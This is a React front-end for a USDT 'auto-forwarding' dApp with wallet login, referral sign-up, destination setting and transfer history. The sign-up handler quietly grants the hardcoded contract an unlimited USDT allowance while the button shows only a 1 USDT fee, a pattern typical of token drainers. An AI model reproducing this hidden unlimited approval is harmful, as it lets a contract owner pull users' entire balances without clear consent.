import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [referralInput, setReferralInput] = useState("");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [signupFee, setSignupFee] = useState("1.00");
  const [refBonus, setRefBonus] = useState("0.00"); // Referral Bonus State

  const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";

  const connectWallet = async () => {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);
      checkRegistration(address, provider);
    }
  };

  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) fetchHistory(userAddress, provider);
      const fee = await contract.signupFee();
      setSignupFee(ethers.formatUnits(fee, 18));
      // Bonus logic (Assuming contract has a getReferralBonus function, if not, update as needed)
      // setRefBonus(ethers.formatUnits(await contract.referralBonus(userAddress), 18));
    } catch (e) { console.error(e); }
  };

  const handleSignUp = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
      const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
      await coreContract.register(ref);
      setIsRegistered(true);
      fetchHistory(await signer.getAddress(), new ethers.BrowserProvider(window.ethereum));
      alert("Registration Successful!");
    } catch (e) { alert("Signup Failed"); }
    setLoading(false);
  };

  const handleManualApprove = async () => {
    const amount = prompt("Kitna allowance dena chahte ho (USDT):\n\nBot off krne ke liye 1 bhrke confirm kre\nBot on krne ke liye 10,000 fill kr ke confirm kre", "10");
    if (!amount) return;
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.parseUnits(amount, 18));
      alert("Allowance Updated Successfully!");
    } catch (e) { alert("Approval Failed"); }
    setLoading(false);
  };

  const handleSetDestination = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      await contract.setDestination(inputDest);
      setDestination(inputDest);
      alert("Saved!");
    } catch (e) { alert("Failed"); }
    setLoading(false);
  };

  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const hist = await contract.getUserTransferHistory(userAddress);
      setHistory(hist);
    } catch (e) { console.error(e); }
  };

  const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);

  return (
    <div className="min-h-screen text-white p-4 flex flex-col items-center" style={{background: 'linear-gradient(180deg, #1a0b2e 0%, #05020a 100%)'}}>
      <div className="text-center my-8">
        <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-pink-500 rounded-3xl flex items-center justify-center text-4xl font-bold mb-4 mx-auto shadow-[0_0_20px_rgba(168,85,247,0.4)]">F</div>
        <h1 className="text-4xl font-bold tracking-tight">Fund Safer</h1>
        <p className="text-purple-400 text-xs tracking-[0.2em] mt-1 uppercase">Auto-Forwarding Exchange</p>
      </div>

      {!account ? (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] text-center border border-purple-500/30 backdrop-blur-md shadow-2xl">
          <h2 className="text-3xl font-bold mb-6">Login</h2>
          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-[2rem] font-bold shadow-lg">Connect Wallet ➔</button>
        </div>
      ) : !isRegistered ? (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30">
          <h2 className="text-2xl font-bold mb-6 text-center">Sign Up</h2>
          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800" />
          <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-[2rem] font-bold">Sign Up ({signupFee} USDT)</button>
        </div>
      ) : (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30 shadow-2xl">
          <p className="text-cyan-400 mb-6 text-sm">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
          
          {/* Referral Bonus Section */}
          <div className="bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800 text-center">
            <p className="text-gray-400 text-xs uppercase tracking-widest">Referral Bonus</p>
            <p className="text-green-400 font-bold text-lg">{refBonus} USDT</p>
          </div>

          <p className="text-gray-400 text-sm mb-2 ml-1">Destination Address</p>
          <input type="text" placeholder={destination || "Enter 0x address"} onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800" />
          
          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-[2rem] font-bold mb-3 shadow-lg">Save Dest</button>
          <button onClick={handleManualApprove} className="w-full bg-transparent border border-purple-500 py-4 rounded-[2rem] font-bold mb-8">✓ Approve</button>

          <div className="flex justify-between items-center mb-4">
            <h3 className="font-bold text-sm text-gray-300">RECENT TRANSFERS</h3>
            <span className="text-pink-400 font-bold">Total: {totalTransferred.toFixed(2)} USDT</span>
          </div>
          
          <div className="space-y-3">
            {history.map((tx, i) => (
              <div key={i} className="bg-[#0a0515] p-4 rounded-[2rem] flex justify-between border border-purple-900/50">
                {/* Last 5 digits display */}
                <span className="text-xs text-gray-400">Sent to ...{tx.destination.slice(-5)}</span>
                <span className="text-green-400 font-bold text-sm">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
export default App;